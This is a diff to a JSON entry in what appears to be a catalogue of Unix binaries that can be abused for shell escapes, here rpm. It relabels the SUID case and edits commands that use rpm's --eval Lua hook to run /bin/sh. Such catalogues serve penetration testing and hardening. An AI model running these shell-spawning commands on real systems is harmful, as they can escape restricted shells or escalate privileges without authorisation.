@@ -5,9 +5,9 @@
         "code": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
       }
     ],
-    "suid": [
+    "limited-suid": [
       {
-        "code": "./rpm --eval '%{lua:os.execute(\"/bin/sh\", \"-p\")}'"
+        "code": "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
       }
     ],
     "sudo": [
